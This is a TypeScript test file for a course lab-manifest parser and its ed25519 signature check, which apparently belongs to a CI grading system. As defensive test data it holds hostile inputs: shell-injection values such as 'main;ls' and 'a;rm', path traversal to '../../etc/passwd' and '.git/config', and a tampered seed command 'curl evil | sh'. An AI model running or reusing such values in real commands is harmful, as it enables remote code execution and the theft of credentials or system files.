import { generateKeyPairSync, sign } from "node:crypto"
import { ManifestPolicy } from "./manifest.policy"
import { chaosEnvOf, labOf, labTaskIdOf } from "./lab.policy"
import { gradeBody, labBody } from "./lab.testing"
import type { LabSection } from "./lab.contracts"

const KEYS = generateKeyPairSync("ed25519")
const PUBLIC_PEM = KEYS.publicKey.export({ type: "spki", format: "pem" }).toString()
const OTHER = generateKeyPairSync("ed25519")

const payloadOf = (lab: unknown, taskId = "course:backend/orders"): string =>
    JSON.stringify({ manifestId: "m-1", taskId, lab })

const signedBy = (payload: string, key = KEYS.privateKey): string =>
    sign(null, Buffer.from(payload, "utf8"), key).toString("base64")

describe("labOf", () => {
    it("is absent for a manifest without a lab and reads a whole lab section", () => {
        expect(labOf(undefined)).toBeUndefined()

        const lab = labOf(labBody({ chaosOn: ["slow-db"] })) as LabSection
        expect(lab).toMatchObject({
            courseId: "backend",
            lessonId: "orders",
            repo: { branch: "main", commit: null },
            project: "backend-orders",
            services: ["api", "db"],
            chaosOn: ["slow-db"],
            action: "boot",
        })
        expect(labTaskIdOf(lab)).toBe("course:backend/orders")
        expect(lab.grade).toBeUndefined()
    })

    it("reads a grade section only on a grade action, with its hidden files", () => {
        const lab = labOf(labBody({ action: "grade", grade: gradeBody() })) as LabSection

        expect(lab.grade).toMatchObject({ submissionId: "sub-1", nonce: "nonce-1", seedOrder: ["base", "orders"] })
        expect(lab.grade?.files[0]?.path).toBe("hidden/orders.hidden.test.ts")
        expect(labOf(labBody({ action: "grade" }))).toBeNull()
        expect(labOf(labBody({ action: "test", grade: gradeBody() }))).toBeNull()
    })

    it.each([
        ["an unknown action", { action: "destroy" }],
        ["a repo url with a user", { repo: { url: "https://token@github.com/a/b.git", branch: "main", commit: null } }],
        ["a repo url that is not https", { repo: { url: "git@github.com:a/b.git", branch: "main", commit: null } }],
        ["a repo url with a shell character", { repo: { url: "https://x.test/a;rm", branch: "main", commit: null } }],
        ["a branch with a shell character", { repo: { url: "https://x.test/a.git", branch: "main;ls", commit: null } }],
        ["a commit that is not a sha", { repo: { url: "https://x.test/a.git", branch: "main", commit: "HEAD" } }],
        ["a compose path above the clone", { compose: "../compose.yml" }],
        ["a file path above the clone", { files: ["../secret"] }],
        ["a file path in .git", { files: [".git/config"] }],
        ["a service with a space", { services: ["api server"] }],
        ["a chaos env that is not an env name", { chaos: [{ id: "x", env: "bad name", value: "1" }] }],
        ["a chaosOn id that no chaos defines", { chaosOn: ["nope"] }],
        ["a seed command without a timeout", { seed: { command: "x" } }],
        ["a test command that is empty", { test: { command: " ", report: "r.xml", timeoutMs: 1 } }],
    ])("refuses the whole lab for %s", (_name, extra) => {
        expect(labOf(labBody(extra))).toBeNull()
    })

    it("refuses a hidden file whose path leaves the checkout or whose hash is not a sha256", () => {
        const good = gradeBody() as { files: Array<Record<string, unknown>> }
        const escape = { ...gradeBody(), files: [{ ...good.files[0], path: "../x" }] }
        const badHash = { ...gradeBody(), files: [{ ...good.files[0], sha256: "abc" }] }

        expect(labOf(labBody({ action: "grade", grade: escape }))).toBeNull()
        expect(labOf(labBody({ action: "grade", grade: badHash }))).toBeNull()
    })
})

describe("chaosEnvOf", () => {
    it("sets only the variables of the chaos ids that are on", () => {
        const lab = labOf(labBody({ chaosOn: ["drop-queue"] })) as LabSection

        expect(chaosEnvOf(lab)).toEqual({ CHAOS_DROP_QUEUE: "1" })
        expect(chaosEnvOf(labOf(labBody()) as LabSection)).toEqual({})
    })
})

describe("a lab manifest through the signature check", () => {
    const policy = new ManifestPolicy()

    it("is verified when StarCi signed it, with no checks of its own", () => {
        const payload = payloadOf(labBody())
        const read = policy.verified(payload, signedBy(payload), PUBLIC_PEM)

        expect(read.kind).toBe("verified")
        if (read.kind === "verified") {
            expect(read.manifest.checks).toEqual([])
            expect(read.manifest.lab?.courseId).toBe("backend")
        }
    })

    it("is rejected when it is unsigned, signed by another key or altered after signing", () => {
        const payload = payloadOf(labBody())

        expect(policy.verified(payload, "", PUBLIC_PEM)).toMatchObject({ kind: "rejected" })
        expect(policy.verified(payload, signedBy(payload, OTHER.privateKey), PUBLIC_PEM)).toEqual({
            kind: "rejected",
            cause: "signature",
        })
        const signature = signedBy(payload)
        expect(policy.verified(payload.replace("npm run seed", "curl evil | sh"), signature, PUBLIC_PEM)).toEqual({
            kind: "rejected",
            cause: "signature",
        })
    })

    it("is rejected when its task id does not name its own course and lesson", () => {
        const payload = payloadOf(labBody(), "course:backend/other")

        expect(policy.verified(payload, signedBy(payload), PUBLIC_PEM)).toEqual({ kind: "rejected", cause: "payload" })
    })

    it("is rejected when its lab is malformed even though it is signed", () => {
        const payload = payloadOf(labBody({ files: ["../../etc/passwd"] }))

        expect(policy.verified(payload, signedBy(payload), PUBLIC_PEM)).toEqual({ kind: "rejected", cause: "payload" })
    })
})
